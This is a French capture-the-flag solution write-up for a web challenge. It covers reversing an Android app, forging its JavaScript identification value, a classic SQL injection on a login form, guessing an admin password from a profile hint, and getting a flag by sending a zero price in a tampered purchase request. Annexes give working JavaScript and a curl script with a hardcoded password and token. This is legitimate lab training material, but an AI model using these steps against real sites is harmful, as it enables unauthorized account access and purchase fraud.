Ce que vous avez obtenu en reversant l'application android :

- le lien du site
- le lien de l'ancien site
- le user agent à utiliser (incluant un token et un numéro de version)


Les étapes à suivre :

- se rendre sur le vieux site (lien obtenu pendant le reverse)
- désobfusquer le javascript
- constater que le js vérifie que l'objet Android, défini seulement sous android, existe et a deux propriétés : identification et showToast et qu'il met dans la variable id la valeur retournée par identification
- obtenir un code d'authentification généré aléatoirement par le serveur en effectuant une requête à : "index.php?request=get_authentication_code"
- retirer la partie qui effectue des appels à Android pour obtenir l'id et construire la valeur id en concaténant le hash sha256 du token obtenu via le reverse (fin du user agent) et le code d'authentification serveur obtenable avec une requête ajax (cf annexe 1 et 2). Il est également possible de placer des breakpoints. Par exemple, on peut placer un breakpoint au début du code pour créer un objet Android ayant les deux propriétés qui nous intéressent (identification et showToast) dans la console, et placer un breakpoint après l'affectation de id pour le mettre à jour avec la bonne valeur avec le code donné en annexe 2 par exemple. On remarque qu'il n'est pas possible d'affecter à Android la fonction identification qui retourne la bonne valeur de id car elle n'est pas asynchrone (contrairement à la requête ajax)
- mettre le user agent de l'application obtenu lors de la phase de reverse (attention, le champs version du user agent change selon la version du site, la version est indiquée en commentaire en haut des fichiers html)
- faire une injection sql sur la page de connexion du vieux site (cf annexe 3)
- constater que la description du profil de l'admin est un indice sur son mot de passe
- tester les combinaisons les plus évidentes, ça devrait être rapide (éviter les outils comme crunch et john) et connectez-vous sur le nouveau site
- constater qu'un item drapeau est en vente, seul bémol, impossible de l'acheter car le module de paiement est en panne
- constater que, lors d'un achat, le prix est envoyé depuis le javascript, et en déduire-en qu'il n'y a probablement pas de vérification avec la base de données
- modifier le javascript pour envoyer un prix nul et cliquer sur le bouton d'achat (une fenêtre de téléchargement du drapeau s'ouvre), ou envoyer directement une requête POST avec curl ou tout autre outil (cf annexe 4)


Annexes :

- annexe 1 : hasher le token en javascript (https seulement) :
const token_str = navigator.userAgent.slice(-14);
const token_bytes = new TextEncoder().encode(token_str);
const token_hash_buffer = await crypto.subtle.digest('SHA-256', token_bytes);
const token_hash_bytes = Array.from(new Uint8Array(token_hash_buffer));
const token_hash_str = token_hash_bytes.map(b => b.toString(16).padStart(2, '0')).join('');
id = user_agent_hash_str;

- annexe 2 : obtenir le code aléatoire et régler l'id (hash en dur) :
const ajax_auth = new XMLHttpRequest();
ajax_auth.onreadystatechange = () => {
	if(ajax_auth.readyState !== XMLHttpRequest.DONE)
	{
		return;
	}
	id = 'b69e8eff9a76f51ddad849f051127efe625e826c2e4e2bc4f45fe638ccf42616' + ajax_auth.status.toString();
};
ajax_auth.open('GET', 'index.php?request=get_authentication_code', true);
ajax_auth.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
ajax_auth.send();

- annexe 3 : injection SQL :
1' OR '1' = '1

- annexe 4 : télécharger drapeau :
VERSION=1.1
PASSWORD=theophile0910
TOKEN_HASH=b69e8eff9a76f51ddad849f051127efe625e826c2e4e2bc4f45fe638ccf42616
RAND_CODE=$(curl --cookie-jar cookie.txt -I https://web-dev.dynamic-dns.net/?request=get_authentication_code | grep HTTP/1.1 | awk -F ' ' '{print $2}')
curl --cookie cookie.txt -A "Mozilla/5.0 ? id:BuyExpress/${VERSION}/A1548S968D2563" -X POST -F 'login=admin' -F "password=${PASSWORD}" -F "id=${TOKEN_HASH}${RAND_CODE}" https://web-dev.dynamic-dns.net/?request=sign_in
curl --cookie cookie.txt -X POST -F 'id=4' -F 'quantity=1' -F 'price=0.0' https://web-dev.dynamic-dns.net/?request=buy_product | tail -n +2 > flag.txt
rm -f cookie.txt
